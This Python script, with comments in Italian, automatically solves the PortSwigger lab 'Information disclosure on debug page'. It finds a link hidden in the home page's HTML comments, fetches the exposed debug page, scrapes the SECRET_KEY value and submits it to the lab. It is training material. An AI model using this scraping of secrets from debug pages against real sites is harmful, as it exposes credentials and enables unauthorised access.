# Script for Portswigger lab "Information disclosure on debug page"

from collections import namedtuple
import requests
from lxml import html

from http import HTTPStatus
from rich.console import Console
from rich.table import Table

console = Console()

SERVER="https://0aa2003f04ca4acf81dbd47900a000ca.web-security-academy.net"
SUBMIT_ENDPOINT="/submitSolution"

def extract_link(comments):
    # Cerca un link all'interno del primo commento trovato
    for comment in comments:
        comment_text = comment.text.strip()  # Estrai il testo del commento
        if "<a href=" in comment_text:
            # Parsing del contenuto del commento come HTML
            comment_tree = html.fromstring(comment_text)
            # Trova il primo link all'interno del commento
            links = comment_tree.xpath("//a/@href")
            if links:
                commented_link = links[0]
                console.print(f"link: {commented_link}")
                return commented_link

    console.print("No link found in comments.")
    return None


def get_comment_from_home_page(html_page):
    comments = html_page.xpath("//comment()")
    console.print(f"comments: {comments}")
    
    return extract_link(comments)


def get_home_page():
    res = []
    response = requests.get(f"{SERVER}")
    if response.status_code == HTTPStatus.OK:
        html_document = html.fromstring(response.content)
        return get_comment_from_home_page(html_document)
    return False

def retrieve_secret(link):
    response = requests.get(f"{SERVER}{link}")
    if response.status_code == HTTPStatus.OK:
        html_document = html.fromstring(response.content)
        secret = html_document.xpath("//tr[td[@class='e' and normalize-space(text())='SECRET_KEY']]/td[@class='v']/text()")[0].strip()
        # altro modo per recuperare il secret: secret = html_document.xpath("//tr[td[@class='e' and normalize-space(text())='SECRET_KEY']]/td[@class='v']/text()")
        return secret
    return None

def submit_secret(secret):
    body = f'answer={secret}'
    response = requests.post(f"{SERVER}{SUBMIT_ENDPOINT}", data=body)
    return response.status_code == HTTPStatus.OK


with console.status("Fetching html comments..."):
    link = get_home_page()
    console.log(f"Fetched {link}")
with console.status("Retriening secret key..."):
    secret = retrieve_secret(link)
    console.log(f"Fetched secret {secret}")
with console.status("Submitting secret..."):
    res = submit_secret(secret)
    console.log("Lab solved!" if res else "Lab not solved")


